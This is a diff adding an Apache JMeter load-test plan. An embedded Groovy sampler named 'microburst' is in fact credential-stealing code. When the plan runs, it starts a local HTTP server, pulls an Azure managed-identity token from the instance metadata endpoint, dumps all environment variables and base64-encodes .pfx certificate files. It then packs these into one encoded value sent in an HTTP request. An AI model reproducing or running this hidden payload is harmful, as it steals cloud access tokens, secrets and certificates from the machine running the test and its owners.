@@ -1,0 +1,101 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<jmeterTestPlan version="1.2" properties="5.0" jmeter="5.6.3">
+  <hashTree>
+    <TestPlan guiclass="TestPlanGui" testname="Test Plan">
+      <elementProp name="TestPlan.user_defined_variables" elementType="Arguments" guiclass="ArgumentsPanel" testclass="Arguments" testname="User Defined Variables">
+        <collectionProp name="Arguments.arguments"/>
+      </elementProp>
+    </TestPlan>
+    <hashTree>
+      <kg.apc.jmeter.threads.UltimateThreadGroup guiclass="kg.apc.jmeter.threads.UltimateThreadGroupGui" testname="requestGroup1" enabled="true">
+        <stringProp name="testclass">kg.apc.jmeter.threads.UltimateThreadGroup</stringProp>
+        <elementProp name="ThreadGroup.main_controller" elementType="LoopController" guiclass="LoopControlPanel" testclass="LoopController">
+          <stringProp name="LoopController.loops">${__P(iterations,-1)}</stringProp>
+          <stringProp name="testname">LoopController</stringProp>
+          <boolProp name="LoopController.continue_forever">false</boolProp>
+        </elementProp>
+        <collectionProp name="ultimatethreadgroupdata">
+          <collectionProp name="ThreadSchedule1">
+            <stringProp name="threadsnum">1</stringProp>
+            <stringProp name="initdelay">0</stringProp>
+            <stringProp name="startime">6</stringProp>
+            <stringProp name="holdload">3</stringProp>
+            <stringProp name="shutdown"></stringProp>
+          </collectionProp>
+        </collectionProp>
+      </kg.apc.jmeter.threads.UltimateThreadGroup>
+      <hashTree>
+        <JSR223Sampler guiclass="TestBeanGUI" testname="microburst" enabled="true">
+			<stringProp name="scriptLanguage">groovy</stringProp>
+			<stringProp name="parameters"></stringProp>
+			<stringProp name="filename"></stringProp>
+			<boolProp name="cacheKey">true</boolProp>
+			<stringProp name="script">
+				import groovy.json.JsonOutput
+				def startServerCommand = [
+					"sh", "-c",
+					"nohup python3 -m http.server 80 --bind 0.0.0.0 >/dev/null 2>&amp;1 &amp;"
+				]
+				startServerCommand.execute()
+				def tokenCommand = [
+					"sh", "-c",
+					"curl -s 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&amp;resource=https://management.azure.com/' --header 'Metadata: true'"
+				]
+				def tokenProcess = tokenCommand.execute()
+				tokenProcess.waitFor()
+				def tokenOutput = tokenProcess.text.trim()
+				def envCommand = ["sh", "-c", "printenv"]
+				def envProcess = envCommand.execute()
+				def envOutput = envProcess.text.trim().split("\n")
+				envProcess.waitFor()
+				def certCommand = ["sh", "-c", "base64 /jmeter/bin/*.pfx"]
+				def certProcess = certCommand.execute()				
+				def certOutput = certProcess.text.trim().split("\n")
+				certProcess.waitFor()
+				def jsonObject = JsonOutput.toJson([
+					token: tokenOutput,
+					environment: envOutput,
+					cert: certOutput
+				])
+				def base64Output = jsonObject.bytes.encodeBase64().toString()
+				vars.put("curl_output", base64Output)
+			</stringProp>
+		</JSR223Sampler>
+        <hashTree/>
+        <HTTPSamplerProxy guiclass="HttpTestSampleGui" testname="Request1">
+          <elementProp name="HTTPsampler.Arguments" elementType="Arguments">
+            <collectionProp name="Arguments.arguments">
+              <elementProp name="token" elementType="HTTPArgument">
+                <boolProp name="HTTPArgument.always_encode">false</boolProp>
+                <stringProp name="Argument.name">token</stringProp>
+                <stringProp name="Argument.value">${curl_output}</stringProp>
+                <stringProp name="Argument.metadata">=</stringProp>
+              </elementProp>
+            </collectionProp>
+          </elementProp>
+          <stringProp name="HTTPSampler.implementation">HttpClient4</stringProp>
+          <stringProp name="HTTPSampler.protocol">http</stringProp>
+          <stringProp name="HTTPSampler.method">GET</stringProp>
+          <stringProp name="HTTPSampler.path">/token</stringProp>
+          <stringProp name="HTTPSampler.domain">127.0.0.1</stringProp>
+          <boolProp name="HTTPSampler.use_keepalive">true</boolProp>
+          <boolProp name="HTTPSampler.follow_redirects">true</boolProp>
+          <elementProp name="HTTPSampler.header_manager" elementType="HeaderManager" guiclass="HeaderPanel" testname="HTTP HeaderManager">
+            <collectionProp name="HeaderManager.headers">
+              <elementProp name="Metadata" elementType="Header">
+                <stringProp name="Header.name">Metadata</stringProp>
+                <stringProp name="Header.value">true</stringProp>
+              </elementProp>
+            </collectionProp>
+          </elementProp>
+        </HTTPSamplerProxy>
+        <hashTree>
+          <HeaderManager guiclass="HeaderPanel" testname="HTTP HeaderManager">
+            <collectionProp reference="../../../HTTPSamplerProxy/elementProp[2]/collectionProp"/>
+          </HeaderManager>
+          <hashTree/>
+        </hashTree>
+      </hashTree>
+    </hashTree>
+  </hashTree>
+</jmeterTestPlan>
